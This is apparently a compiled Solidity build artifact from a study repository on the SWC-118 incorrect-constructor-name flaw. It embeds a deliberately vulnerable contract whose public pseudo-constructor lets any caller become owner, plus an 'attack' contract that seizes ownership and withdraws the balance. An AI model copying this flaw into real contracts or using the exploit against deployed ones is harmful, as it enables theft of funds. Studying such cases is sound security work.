{
  "contractName": "attack",
  "abi": [
    {
      "constant": false,
      "inputs": [
        {
          "name": "_swc118_contract",
          "type": "address"
        },
        {
          "name": "attack_address",
          "type": "address"
        }
      ],
      "name": "setaddr",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack_swc118",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack_withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506102de806100206000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806318626de31461005c57806323b8f82f146100bf5780638ef09267146100d6575b600080fd5b34801561006857600080fd5b506100bd600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100ed565b005b3480156100cb57600080fd5b506100d4610172565b005b3480156100e257600080fd5b506100eb610212565b005b81600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a2024d5a6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101f857600080fd5b505af115801561020c573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561029857600080fd5b505af11580156102ac573d6000803e3d6000fd5b505050505600a165627a7a723058201bc6c6fc93790a9359a3fa9bb4e2c544108fac9cc3cfc650d46296861309af730029",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\ncontract swc118{\n  address private owner;\n  event a_payable(address msg_sender, address _owner, uint256 value);\n  event _withdraw(address msg_sender, address _owner, uint256 value);\n  event setowner_event(address owner, address msg_sender);\n\n  //함수지정자\n  // _;는 함수를 실행하기 전에 행동을 제한하는 것에 사용\n  modifier onlyowner{\n    require(msg.sender==owner,\n    \"only owner call this\");\n    //require 행동을 완료하고, _; 함수를 실행시킨다는 의미\n    _;\n  }\n\n  //생성자, 일반 함수로 호출, 생성자 및 owner는 계속 변경됨\n  //호출당하면 owner의 값이 변경됨 msg.sender == owner\n  function Swc118() public{\n    emit setowner_event(owner, msg.sender);\n    owner = msg.sender;\n  } \n\n  //생성자 fixed\n  /*constructor()\n        public\n    {\n        owner = msg.sender;\n    }*/\n\n  function a() payable{\n    emit a_payable(msg.sender, owner, msg.value);\n  }\n\n  //onlyowner만 호출할 수 있음\n  function withdraw() public onlyowner{\n    require(msg.sender==owner,\n    \"msg.sender is not owner\");\n    emit _withdraw(msg.sender, owner, this.balance);\n    owner.transfer(this.balance);\n  }\n}\n\ncontract attack{\n  address attacker;\n  swc118 swc118_contract;\n\n  //컨트랙트 및 공격자의 주소를 설정 \n  function setaddr(swc118 _swc118_contract, address attack_address) {\n    swc118_contract = _swc118_contract;\n    attacker = attack_address;\n  }\n\n  //Swc118 함수를 호출해서 owner를 재설정\n  function attack_swc118() {\n    swc118_contract.Swc118();\n  }\n\n  function attack_withdraw(){\n    swc118_contract.withdraw();\n  }\n\n}",
  "sourcePath": "C:/Users/vlfgh/OneDrive/Desktop/swc-git/swc118/contracts/swc118.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.4.1",
  "updatedAt": "2021-08-20T07:20:38.421Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}